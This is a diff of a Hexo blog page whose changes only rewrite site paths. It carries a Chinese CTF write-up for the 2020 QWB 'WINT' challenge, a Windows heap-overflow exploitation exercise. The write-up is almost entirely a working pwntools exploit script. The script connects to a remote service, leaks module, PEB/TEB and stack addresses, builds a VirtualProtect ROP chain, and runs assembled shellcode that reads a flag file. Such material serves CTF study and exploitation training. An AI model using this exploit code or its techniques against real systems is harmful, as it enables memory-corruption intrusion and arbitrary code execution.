@@ -5,29 +5,29 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="edit功能存在溢出，可以控制string对象，来实现任意地址读写  控制string对象，泄露出exe基址和dll的基址，然后就是泄露peb、teb地址，得到stack_base，为了能够准确得到栈rop的地址，我们在栈里布置一个字符串用来做TAG，然后利用任意地址读写从stack_base处开始搜索栈，直到找到我们布下的这个TAG。然后就是做ROP更改堆的执行权限后跳到堆里执行shellcod">
 <meta property="og:type" content="article">
 <meta property="og:title" content="qwb2020_WINT">
-<meta property="og:url" content="https://github.com/ha1vk/2020/08/21/qwb2020-WINT/index.html">
+<meta property="og:url" content="https://github.com/2020/08/21/qwb2020-WINT/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="edit功能存在溢出，可以控制string对象，来实现任意地址读写  控制string对象，泄露出exe基址和dll的基址，然后就是泄露peb、teb地址，得到stack_base，为了能够准确得到栈rop的地址，我们在栈里布置一个字符串用来做TAG，然后利用任意地址读写从stack_base处开始搜索栈，直到找到我们布下的这个TAG。然后就是做ROP更改堆的执行权限后跳到堆里执行shellcod">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/08/21/qwb2020-WINT/1.png">
+<meta property="og:image" content="https://github.com/2020/08/21/qwb2020-WINT/1.png">
 <meta property="article:published_time" content="2020-08-21T07:56:14.000Z">
 <meta property="article:modified_time" content="2025-06-26T06:20:06.005Z">
 <meta property="article:author" content="ha1vk">
@@ -36,9 +36,9 @@
 <meta property="article:tag" content="堆溢出">
 <meta property="article:tag" content="windows漏洞利用">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/08/21/qwb2020-WINT/1.png">
+<meta name="twitter:image" content="https://github.com/2020/08/21/qwb2020-WINT/1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/08/21/qwb2020-WINT/">
+<link rel="canonical" href="https://github.com/2020/08/21/qwb2020-WINT/">
 
 
 <script id="page-configurations">
@@ -100,7 +100,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -121,27 +121,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -199,10 +199,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/08/21/qwb2020-WINT/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/08/21/qwb2020-WINT/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -237,7 +237,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -260,7 +260,7 @@
 
       
         <p>edit功能存在溢出，可以控制string对象，来实现任意地址读写</p>
-<img src="/ha1vk/2020/08/21/qwb2020-WINT/1.png" class="">
+<img src="/2020/08/21/qwb2020-WINT/1.png" class="">
 <p>控制string对象，泄露出exe基址和dll的基址，然后就是泄露peb、teb地址，得到stack_base，为了能够准确得到栈rop的地址，我们在栈里布置一个字符串用来做TAG，然后利用任意地址读写从stack_base处开始搜索栈，直到找到我们布下的这个TAG。然后就是做ROP更改堆的执行权限后跳到堆里执行shellcode。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line"><span class="comment">#sh = remote(&#x27;192.168.232.147&#x27;,6666)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;121.40.103.62&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line">kernel32_free = <span class="number">0x1180</span></span><br><span class="line">VirtualProtect = <span class="number">0x14F0</span></span><br><span class="line">CreateFileA = <span class="number">0x2F00</span></span><br><span class="line">ReadFile = <span class="number">0x1DE0</span></span><br><span class="line">WriteFile = <span class="number">0x1E10</span></span><br><span class="line">GetStdHandle = <span class="number">0x16E0</span></span><br><span class="line">HeapAlloc = <span class="number">0x30810</span></span><br><span class="line">ntdll_PebLdr = <span class="number">0x1313c8</span></span><br><span class="line"><span class="comment">#pop r9 ; pop r8 ; pop rdx ; pop rcx ; jmp rax</span></span><br><span class="line">pop_4 = <span class="number">0x92ea3</span></span><br><span class="line">pop_rax = <span class="number">0x1548c</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;4. Exit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,name)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;age:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;data:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;4. Exit&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;4. Exit&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,name,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;4. Exit&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,name)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;age:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;data:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x20</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="string">&#x27;2&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x20</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">   exe_base = <span class="number">0x7FF7F09A0000</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="comment">#溢出</span></span><br><span class="line">   edit(<span class="number">0</span>,<span class="number">0x32</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + <span class="string">&#x27;\x70\x74&#x27;</span>)</span><br><span class="line">   show(<span class="number">1</span>)</span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">   exe_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x3d650</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_iat = exe_base + <span class="number">0x34010</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;exe_base=&#x27;</span>,<span class="built_in">hex</span>(exe_base)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(free_iat))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">free_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">kernel32_base = free_addr - kernel32_free</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;kernel32_base=&#x27;</span>,<span class="built_in">hex</span>(kernel32_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VirtualProtect_addr = kernel32_base + VirtualProtect</span><br><span class="line">CreateFileA_addr = kernel32_base + CreateFileA</span><br><span class="line">ReadFile_addr = kernel32_base + ReadFile</span><br><span class="line">WriteFile_addr = kernel32_base + WriteFile</span><br><span class="line">GetStdHandle_addr = kernel32_base + GetStdHandle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;sub rsp,0x8 /*栈对齐*/</span></span><br><span class="line"><span class="string">        mov rax,0x7478</span></span><br><span class="line"><span class="string">        mov [rsp+0x110],rax</span></span><br><span class="line"><span class="string">        mov rax,0x742E67616C665C5C</span></span><br><span class="line"><span class="string">        mov [rsp+0x108],rax</span></span><br><span class="line"><span class="string">        mov rax,0x544E49575C5C3A43</span></span><br><span class="line"><span class="string">        mov [rsp+0x100],rax</span></span><br><span class="line"><span class="string">        mov qword ptr[rsp+0x30],0 /*hTemplateFile*/</span></span><br><span class="line"><span class="string">        mov qword ptr[rsp+0x28],0x80 /* dwFlagsAndAttributes*/</span></span><br><span class="line"><span class="string">        mov qword ptr[rsp+0x20],3 /* dwCreationDisposition*/</span></span><br><span class="line"><span class="string">        lea rcx,[rsp+0x100]</span></span><br><span class="line"><span class="string">        mov edx,0x80000000</span></span><br><span class="line"><span class="string">        mov r8d,1</span></span><br><span class="line"><span class="string">        xor r9d,r9d</span></span><br><span class="line"><span class="string">        mov rax,%d</span></span><br><span class="line"><span class="string">        call rax /*CreateFileA打开文件*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov qword ptr[rsp+0x20],0</span></span><br><span class="line"><span class="string">        mov qword ptr[rsp+0x28],0</span></span><br><span class="line"><span class="string">        mov rcx,rax         /*hFile*/</span></span><br><span class="line"><span class="string">        lea rdx,[rsp+0x200]  /*lpBuffer*/</span></span><br><span class="line"><span class="string">        mov r8d,0x100       /*nNumberOfBytesToRead*/</span></span><br><span class="line"><span class="string">        xor r9d,r9d</span></span><br><span class="line"><span class="string">        mov rax,%d</span></span><br><span class="line"><span class="string">        call rax /*ReadFile*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov ecx, 0xfffffff5 /*STD_OUTPUT_HANDLE*/</span></span><br><span class="line"><span class="string">        mov rax, %d</span></span><br><span class="line"><span class="string">        call rax /* GetStdHandle*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov qword ptr [rsp+0x20],0 /*lpOverlapped*/</span></span><br><span class="line"><span class="string">        mov rcx,rax                /*hFile*/</span></span><br><span class="line"><span class="string">        lea rdx,[rsp+0x200]                /*lpBuffer*/</span></span><br><span class="line"><span class="string">        mov r8d,0x100              /*nNumberOfBytesToWrite*/</span></span><br><span class="line"><span class="string">        xor r9d, r9d               /*lpNumberOfBytesWritten*/</span></span><br><span class="line"><span class="string">        mov rax, %d</span></span><br><span class="line"><span class="string">        call rax /*WriteFile*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">     &#x27;&#x27;&#x27;</span> % (CreateFileA_addr,ReadFile_addr,GetStdHandle_addr,WriteFile_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(sc,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;3&#x27;</span>*<span class="number">0x10</span>,<span class="built_in">len</span>(shellcode),shellcode) <span class="comment">#3</span></span><br><span class="line">heap_ptr_addr = exe_base + <span class="number">0x4cbd0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(heap_ptr_addr))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">heap_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">shellcode_addr = heap_addr + <span class="number">0x190</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;shellcode_addr=&#x27;</span>,<span class="built_in">hex</span>(shellcode_addr)</span><br><span class="line">HeapAlloc_iat = exe_base + <span class="number">0x34020</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(HeapAlloc_iat))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">ntdll_base = u64(sh.recv(<span class="number">8</span>)) - HeapAlloc</span><br><span class="line">ntdll_PebLdr_addr = ntdll_base + ntdll_PebLdr</span><br><span class="line">pop_4 += ntdll_base</span><br><span class="line">pop_rax += ntdll_base</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;ntdll_base=&#x27;</span>,<span class="built_in">hex</span>(ntdll_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;ntdll_PebLdr_addr=&#x27;</span>,<span class="built_in">hex</span>(ntdll_PebLdr_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(ntdll_PebLdr_addr))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">Peb_addr = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x80</span></span><br><span class="line">Teb_addr = Peb_addr - <span class="number">0x2000</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Peb_addr=&#x27;</span>,<span class="built_in">hex</span>(Peb_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Teb_addr=&#x27;</span>,<span class="built_in">hex</span>(Teb_addr)</span><br><span class="line">stack_base_ptr = Teb_addr + <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_base_ptr=&#x27;</span>,<span class="built_in">hex</span>(stack_base_ptr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(stack_base_ptr ))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">stack_base = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_base=&#x27;</span>,<span class="built_in">hex</span>(stack_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#在栈里做一个标记，然后我们搜索栈</span></span><br><span class="line">tag = <span class="string">&#x27;100 &#x27;</span>.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>) + <span class="string">&#x27;TAhaivkG&#x27;</span></span><br><span class="line">delete(tag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr = stack_base</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;searching &#x27;</span>,<span class="built_in">hex</span>(addr),<span class="string">&#x27;....&#x27;</span></span><br><span class="line">   edit(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(addr) + p64(<span class="number">0x10</span>) + p64(<span class="number">0x1000</span>))</span><br><span class="line">   show(<span class="number">1</span>)</span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">   data = sh.recv(<span class="number">0x1000</span>)</span><br><span class="line">   <span class="keyword">if</span> <span class="string">&#x27;TAhaivkG&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">      <span class="built_in">print</span> <span class="string">&#x27;found tag in stack&#x27;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">   addr += <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop_addr = (addr + data.index(<span class="string">&#x27;TAhaivkG&#x27;</span>)) &amp; <span class="number">0xFFFFFFFFFFFFFFF0</span></span><br><span class="line">rop_addr += <span class="number">0x18</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;rop_addr=&#x27;</span>,<span class="built_in">hex</span>(rop_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = p64(pop_rax) + p64(VirtualProtect_addr)</span><br><span class="line">rop += p64(pop_4)</span><br><span class="line">rop += p64(rop_addr) <span class="comment">#oldp</span></span><br><span class="line">rop += p64(<span class="number">0x40</span>) <span class="comment">#flag</span></span><br><span class="line">rop += p64(<span class="number">0x110</span>) <span class="comment">#len</span></span><br><span class="line">rop += p64(shellcode_addr) <span class="comment">#ptr</span></span><br><span class="line"><span class="comment">#ret2shellcode</span></span><br><span class="line">rop += p64(shellcode_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(rop_addr) + p64(<span class="number">0x10</span>) + p64(<span class="number">0x4F</span>) + p64(<span class="number">0</span>) + p64(rop_addr) + p64(<span class="built_in">len</span>(rop)))</span><br><span class="line"><span class="comment">#写rop</span></span><br><span class="line">raw_input()</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(rop),<span class="string">&#x27;b&#x27;</span>,rop)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
     </div>
@@ -271,10 +271,10 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/ROP/" rel="tag"># ROP</a>
-              <a href="/ha1vk/tags/shellcode/" rel="tag"># shellcode</a>
-              <a href="/ha1vk/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag"># 堆溢出</a>
-              <a href="/ha1vk/tags/windows%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag"># windows漏洞利用</a>
+              <a href="/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/tags/shellcode/" rel="tag"># shellcode</a>
+              <a href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag"># 堆溢出</a>
+              <a href="/tags/windows%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag"># windows漏洞利用</a>
           </div>
 
         
@@ -283,11 +283,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/08/21/qwb2020-direct/" rel="prev" title="qwb2020_direct">
+    <a href="/2020/08/21/qwb2020-direct/" rel="prev" title="qwb2020_direct">
       <i class="fa fa-chevron-left"></i> qwb2020_direct
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/09/12/gif2ascii-CVE-2019-11932/" rel="next" title="gif2ascii_CVE_2019_11932">
